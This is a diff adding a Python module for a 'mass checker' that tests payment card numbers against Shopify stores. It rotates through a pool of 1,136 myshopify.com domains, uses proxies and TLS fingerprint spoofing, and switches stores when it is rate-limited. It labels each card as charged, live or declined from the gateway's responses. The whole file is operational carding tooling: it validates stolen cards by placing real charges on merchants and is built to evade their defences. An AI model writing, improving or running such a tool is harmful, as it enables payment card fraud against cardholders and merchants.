@@ -1,0 +1,129 @@
+"""
+Shopify Storefront GraphQL Mass Checker Module (/msh)
+Equipped with 1,136 auto-rotating myshopify.com domains, TLS browser fingerprinting via curl_cffi,
+and Storefront GraphQL proposal negotiation.
+"""
+import asyncio
+import random
+import time
+import re
+from sh_checker import process_card, parse_cc_string, extract_clean_response
+from shopify_sites_pool import SHOPIFY_STORE_POOL
+
+def _normalize_proxy(p: str | None) -> str | None:
+    if not p:
+        return None
+    ps = str(p).strip()
+    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
+        return ps
+    parts = ps.split(":")
+    if len(parts) == 4:
+        if parts[1].isdigit():
+            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        elif parts[3].isdigit():
+            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+        else:
+            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+    elif len(parts) == 2:
+        return f"http://{parts[0]}:{parts[1]}"
+    return f"http://{ps}"
+
+async def check_card_msh(
+    card_str: str,
+    proxy_str: str | None = None,
+    custom_site: str | None = None,
+    max_site_retries: int = 3
+) -> tuple[str, str, str]:
+    """
+    Checks a single card against Shopify Storefront GraphQL.
+    Returns: (status, message, gateway_name)
+      status: 'charged' | 'approved' | 'declined' | 'error'
+    """
+    card_str = str(card_str).strip()
+    parts = [p.strip() for p in card_str.split("|")]
+    if len(parts) < 4:
+        return "declined", "Invalid Card Format (Expected CC|MM|YY|CVV)", "Shopify"
+
+    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
+    if len(ano) == 2:
+        ano = "20" + ano
+    mes = mes.zfill(2)
+
+    formatted_proxy = _normalize_proxy(proxy_str)
+
+    user_supplied_site = bool(custom_site and custom_site.strip())
+    if user_supplied_site:
+        site = custom_site.strip()
+        if not site.startswith("http"):
+            site = "https://" + site
+    else:
+        site = "https://" + random.choice(SHOPIFY_STORE_POOL)
+
+    tried_sites = {site}
+    success = False
+    message = "ERROR"
+    gateway = "Shopify Payments"
+    total_price = "0"
+    currency = "USD"
+
+    for attempt in range(max_site_retries):
+        try:
+            success, message, gateway, total_price, currency = await asyncio.wait_for(
+                process_card(cc, mes, ano, cvv, site, proxy_str=formatted_proxy),
+                timeout=45
+            )
+        except asyncio.TimeoutError:
+            message = "TIMEOUT"
+            if not user_supplied_site and attempt < max_site_retries - 1:
+                candidates = [s for s in SHOPIFY_STORE_POOL if "https://" + s not in tried_sites]
+                if candidates:
+                    site = "https://" + random.choice(candidates)
+                    tried_sites.add(site)
+                    continue
+            break
+        except Exception as e:
+            message = str(e) or type(e).__name__
+            if not user_supplied_site and attempt < max_site_retries - 1:
+                candidates = [s for s in SHOPIFY_STORE_POOL if "https://" + s not in tried_sites]
+                if candidates:
+                    site = "https://" + random.choice(candidates)
+                    tried_sites.add(site)
+                    continue
+            break
+
+        # If rate limited, price too high, or site unreachable, rotate to a fresh site
+        if message in ("RATE_LIMITED_429", "PRICE_TOO_HIGH", "TIMEOUT", "Change Proxy or Site") and not user_supplied_site:
+            if attempt < max_site_retries - 1:
+                candidates = [s for s in SHOPIFY_STORE_POOL if "https://" + s not in tried_sites]
+                if candidates:
+                    site = "https://" + random.choice(candidates)
+                    tried_sites.add(site)
+                    continue
+        break
+
+    clean_msg = extract_clean_response(message)
+    msg_upper = str(message).upper()
+    clean_upper = str(clean_msg).upper()
+    gateway_str = gateway if gateway and gateway not in ("", "UNKNOWN") else "Shopify Payments"
+
+    # Status classification
+    if success is True or "ORDER_PLACED" in msg_upper or "PROCESSEDRECEIPT" in msg_upper:
+        price_display = f"${total_price}" if total_price and str(total_price) not in ("0", "0.0", "0.00") else "Charged"
+        return "charged", f"Charged ({price_display} {currency.upper()})", gateway_str
+
+    if "OTP_REQUIRED" in msg_upper or "ACTIONREQUIRED" in msg_upper or "3DS" in msg_upper:
+        return "approved", "3DS Challenge (OTP Required)", gateway_str
+
+    if "INSUFFICIENT_FUNDS" in msg_upper or "INSUFFICIENT" in clean_upper:
+        return "approved", "Insufficient Funds", gateway_str
+
+    if "INCORRECT_CVC" in msg_upper or "INCORRECT_CVV" in msg_upper or "SECURITY_CODE_INCORRECT" in msg_upper:
+        return "approved", "Incorrect CVV (CCN Live)", gateway_str
+
+    if "MISMATCHED_BILL" in msg_upper or "BILLING_ADDRESS" in msg_upper:
+        return "approved", "AVS Mismatch (Card Live)", gateway_str
+
+    if "TIMEOUT" in msg_upper or "ERROR" in msg_upper and not any(k in msg_upper for k in ("DECLINED", "FAILED", "REJECTED")):
+        return "error", clean_msg if clean_msg else "Gateway Timeout", gateway_str
+
+    return "declined", clean_msg if clean_msg else "Card Declined", gateway_str
